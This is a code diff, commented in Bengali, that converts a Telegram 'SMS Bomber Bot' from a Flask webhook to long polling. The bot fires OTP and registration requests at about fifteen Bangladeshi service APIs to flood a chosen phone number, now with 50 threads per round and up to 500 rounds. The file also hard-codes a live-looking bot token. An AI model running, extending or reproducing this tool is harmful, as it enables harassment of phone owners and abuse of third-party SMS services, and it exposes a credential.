@@ -1,21 +1,22 @@
-import json
+#!/usr/bin/env python3
+import os
 import re
 import random
 import string
 import requests
 import threading
-from flask import Flask, request, jsonify
+import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 from concurrent.futures import ThreadPoolExecutor
 
-app = Flask(__name__)
+# ================= কনফিগারেশন =================
+BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # এখানে আপনার বর্তমান টোকেন বসান
+OWNER_ID = 1700797877  # আপনার টেলিগ্রাম আইডি (মালিক)
+authorized_groups = set()  # অনুমোদিত গ্রুপের আইডি
 
-# ------------------- কনফিগারেশন -------------------
-BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # Shitob-এ ডেপ্লয়ের পর বদলাবেন
-OWNER_ID = 1700797877
-authorized_groups = set()
-
-# ------------------- টেলিগ্রামে মেসেজ পাঠানোর ফাংশন -------------------
-def send_message(chat_id, text, parse_mode=None):
+# ================= টেলিগ্রাম বার্তা পাঠানোর হেল্পার (থ্রেড থেকে কল করতে) =================
+def send_message_sync(chat_id, text, parse_mode=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text}
     if parse_mode:
@@ -25,7 +26,7 @@ def send_message(chat_id, text, parse_mode=None):
     except Exception as e:
         print(f"Send error: {e}")
 
-# ------------------- র‍্যান্ডম স্ট্রিং জেনারেটর -------------------
+# ================= র‍্যান্ডম স্ট্রিং জেনারেটর =================
 def random_string(pattern):
     result = []
     i = 0
@@ -44,7 +45,7 @@ def random_string(pattern):
             i += 1
     return ''.join(result)
 
-# ------------------- HTTP রিকোয়েস্ট হেলপার -------------------
+# ================= HTTP রিকোয়েস্ট হেল্পার =================
 def send_req(url, method, headers, data=None):
     try:
         if method == "POST":
@@ -55,7 +56,7 @@ def send_req(url, method, headers, data=None):
     except:
         return None
 
-# ------------------- ১৫টি এপিআই ফাংশন (আপনার দেওয়া) -------------------
+# ================= ১৫টি এপিআই ফাংশন (ঠিক আপনার দেওয়া) =================
 def api_1(number, pgen, egen, did, name):
     url = "https://core.easy.com.bd/api/v1/registration"
     headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "core.easy.com.bd", "User-Agent": "okhttp/3.9.1"}
@@ -146,124 +147,131 @@ def api_15(number):
     data = {"msisdn": number[1:]}
     return send_req(url, "POST", headers, data)
 
-# ------------------- বোমা চালানোর ফাংশন (হাই কনকারেন্সি) -------------------
-def run_bombing(number, rounds=1):
+# ================= বোম্বিং ফাংশন (প্রতি রাউন্ডে ৫০ থ্রেড, প্রগ্রেস কলব্যাক) =================
+def run_bombing_with_progress(number, rounds, chat_id, loop):
     apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15]
-    total = 0
-    for _ in range(rounds):
+    total_success = 0
+    for round_num in range(1, rounds + 1):
         pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
         egen = random_string("?n?n?n?n?n?n?n?n")
         did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
         name = random_string("?l?l?l?l?l?l")
-        # শুধু Shitob-এ থ্রেড সংখ্যা আরও বাড়ানো যায় (Vercel-এ 20 ছিল)
-        with ThreadPoolExecutor(max_workers=25) as ex:
+        round_success = 0
+        with ThreadPoolExecutor(max_workers=50) as ex:
             futures = [ex.submit(api_1, number, pgen, egen, did, name), ex.submit(api_10, number, pgen, egen, name)]
             futures.extend(ex.submit(api, number) for api in apis)
             for f in futures:
                 r = f.result()
                 if r and r.status_code == 200:
-                    total += 1
-    return total
-
-# ------------------- ওয়েবহুক হ্যান্ডলার (সিঙ্ক) -------------------
-@app.route("/", methods=["POST"])
-def webhook():
-    update = request.get_json()
-    if not update or "message" not in update:
-        return jsonify({"ok": True})
-    
-    msg = update["message"]
-    chat_id = msg["chat"]["id"]
-    user_id = msg["from"]["id"]
-    text = msg.get("text", "")
-    chat_type = msg["chat"]["type"]
-    
-    # গ্রুপ চেক
-    if chat_type != "private" and chat_id not in authorized_groups:
-        send_message(chat_id, f"❌ This group is not authorized. Group ID: `{chat_id}`\nAsk owner to /authgroup", parse_mode="Markdown")
-        return jsonify({"ok": True})
-    
-    # কমান্ড প্রসেসিং
-    if text == "/start" or text == "/help":
-        help_text = (
-            "🤖 **SMS Bomber Bot Commands**\n\n"
-            "🔹 `/start` or `/help` – Show this help\n"
-            "🔹 `/bomb <number> [rounds]` – Send OTP bomb\n"
-            "   Example: `/bomb 01712345678`\n"
-            "   Example: `/bomb 01712345678 5`\n\n"
-            "👑 **Owner only:**\n"
-            "🔸 `/authgroup <group_id>` – Authorize a group\n"
-            "🔸 `/unauthgroup <group_id>` – Remove authorization\n"
-            "🔸 `/listgroups` – List authorized groups\n\n"
-            "⚡ Shitob Cloud: Higher timeout, up to 20+ rounds possible.\n"
-            "🚀 Each round uses 25 parallel threads for max speed."
+                    round_success += 1
+        total_success += round_success
+        # টেলিগ্রামে আপডেট পাঠানো (মেইন ইভেন্ট লুপে)
+        asyncio.run_coroutine_threadsafe(
+            send_progress(chat_id, round_num, round_success, total_success),
+            loop
         )
-        send_message(chat_id, help_text, parse_mode="Markdown")
-    
-    elif text.startswith("/bomb"):
-        parts = text.split()
-        if len(parts) < 2:
-            send_message(chat_id, "Usage: `/bomb 017XXXXXXXX [rounds]`", parse_mode="Markdown")
-            return jsonify({"ok": True})
-        number = parts[1]
-        if not re.match(r'^01[3-9]\d{8}$', number):
-            send_message(chat_id, "❌ Invalid number. Example: 01712345678")
-            return jsonify({"ok": True})
-        rounds = 1
-        if len(parts) > 2 and parts[2].isdigit():
-            # Shitob-এ টাইমআউট বেশি, তাই 30 রাউন্ড পর্যন্ত দেওয়া যেতে পারে (ঝুঁকি নিন)
-            rounds = min(int(parts[2]), 30)
-            if rounds != int(parts[2]):
-                send_message(chat_id, "⚠️ Maximum 30 rounds on Shitob Cloud (adjustable).")
-        send_message(chat_id, f"💣 Bombing `{number}` with {rounds} round(s)...", parse_mode="Markdown")
-        
-        def do_bomb():
-            success = run_bombing(number, rounds)
-            send_message(chat_id, f"✅ Done! {success} successful requests sent to `{number}`.", parse_mode="Markdown")
-        thread = threading.Thread(target=do_bomb)
-        thread.daemon = True
-        thread.start()
-    
-    elif text.startswith("/authgroup") and user_id == OWNER_ID:
-        parts = text.split()
-        if len(parts) != 2:
-            send_message(chat_id, "Usage: `/authgroup -1001234567890`", parse_mode="Markdown")
-            return jsonify({"ok": True})
-        try:
-            gid = int(parts[1])
-            authorized_groups.add(gid)
-            send_message(chat_id, f"✅ Group `{gid}` authorized.", parse_mode="Markdown")
-        except:
-            send_message(chat_id, "Invalid group ID.")
-    
-    elif text.startswith("/unauthgroup") and user_id == OWNER_ID:
-        parts = text.split()
-        if len(parts) != 2:
-            send_message(chat_id, "Usage: `/unauthgroup -1001234567890`", parse_mode="Markdown")
-            return jsonify({"ok": True})
-        try:
-            gid = int(parts[1])
-            authorized_groups.discard(gid)
-            send_message(chat_id, f"✅ Group `{gid}` unauthorized.", parse_mode="Markdown")
-        except:
-            send_message(chat_id, "Invalid group ID.")
-    
-    elif text == "/listgroups" and user_id == OWNER_ID:
-        if not authorized_groups:
-            send_message(chat_id, "No authorized groups.")
-        else:
-            groups = "\n".join(str(g) for g in authorized_groups)
-            send_message(chat_id, f"**Authorized groups:**\n{groups}", parse_mode="Markdown")
-    
+    return total_success
+
+async def send_progress(chat_id, round_num, round_success, total_so_far):
+    # এই ফাংশনটি মেইন ইভেন্ট লুপে কল হবে; এখানে `update` অবজেক্ট নেই, তাই সরাসরি bot.send_message ব্যবহার করতে হবে।
+    # আমরা context ছাড়া bot ইন্সট্যান্স পাব না – তাই সহজ উপায়: আলাদা সিঙ্ক ফাংশন দিয়ে মেসেজ পাঠানো। নিচে করছি।
+    send_message_sync(chat_id, f"✅ Round {round_num}: {round_success} successes (Total so far: {total_so_far})")
+
+# ================= টেলিগ্রাম কমান্ড হ্যান্ডলার =================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤖 **SMS Bomber Bot**\n\n"
+        "/bomb <number> [rounds] – Send OTP bomb\n"
+        "Example: `/bomb 01712345678`\n"
+        "Example: `/bomb 01712345678 50`\n\n"
+        "👑 Owner commands:\n"
+        "/authgroup <group_id>\n"
+        "/unauthgroup <group_id>\n"
+        "/listgroups",
+        parse_mode="Markdown"
+    )
+
+async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    chat_type = update.effective_chat.type
+
+    # গ্রুপ অনুমোদন চেক
+    if chat_type != "private" and chat_id not in authorized_groups:
+        await update.message.reply_text(f"❌ This group not authorized. ID: `{chat_id}`", parse_mode="Markdown")
+        return
+
+    if not args:
+        await update.message.reply_text("Usage: `/bomb 017XXXXXXXX [rounds]`", parse_mode="Markdown")
+        return
+    number = args[0]
+    if not re.match(r'^01[3-9]\d{8}$', number):
+        await update.message.reply_text("❌ Invalid number. Example: 01712345678")
+        return
+    rounds = 1
+    if len(args) > 1 and args[1].isdigit():
+        rounds = int(args[1])
+        if rounds > 500:  # সীমা নির্ধারণ (ইচ্ছামত বাড়াতে পারেন)
+            rounds = 500
+            await update.message.reply_text("⚠️ Max 500 rounds per command.")
+    await update.message.reply_text(f"💣 Bombing `{number}` with {rounds} round(s)...\n_Progress will appear here_", parse_mode="Markdown")
+
+    def do_bomb():
+        loop = context.application.loop
+        total = run_bombing_with_progress(number, rounds, chat_id, loop)
+        asyncio.run_coroutine_threadsafe(
+            update.message.reply_text(f"🎉 **Done!** {total} successful requests sent to `{number}`.", parse_mode="Markdown"),
+            loop
+        )
+    threading.Thread(target=do_bomb).start()
+
+async def authgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("Unauthorized.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: `/authgroup -1001234567890`", parse_mode="Markdown")
+        return
+    try:
+        gid = int(context.args[0])
+        authorized_groups.add(gid)
+        await update.message.reply_text(f"✅ Group `{gid}` authorized.", parse_mode="Markdown")
+    except:
+        await update.message.reply_text("Invalid group ID.")
+
+async def unauthgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return
+    if not context.args:
+        return
+    try:
+        gid = int(context.args[0])
+        authorized_groups.discard(gid)
+        await update.message.reply_text(f"✅ Group `{gid}` unauthorized.", parse_mode="Markdown")
+    except:
+        pass
+
+async def listgroups(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return
+    if not authorized_groups:
+        await update.message.reply_text("No authorized groups.")
     else:
-        send_message(chat_id, "Unknown command. Type `/start` for help.", parse_mode="Markdown")
-    
-    return jsonify({"ok": True})
+        groups = "\n".join(str(g) for g in authorized_groups)
+        await update.message.reply_text(f"**Authorized groups:**\n{groups}", parse_mode="Markdown")
 
-@app.route("/", methods=["GET"])
-def home():
-    return jsonify({"status": "Bomb bot running on Shitob Cloud"})
+# ================= মেইন ফাংশন (লং পোলিং) =================
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", start))
+    app.add_handler(CommandHandler("bomb", bomb))
+    app.add_handler(CommandHandler("authgroup", authgroup))
+    app.add_handler(CommandHandler("unauthgroup", unauthgroup))
+    app.add_handler(CommandHandler("listgroups", listgroups))
+    print("Bot started with long polling...")
+    app.run_polling()
 
-# Shitob Cloud সাধারণত এই অংশটি উপেক্ষা করে (এরা গুনিকর্ন ব্যবহার করে), কিন্তু রাখলাম
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    main()
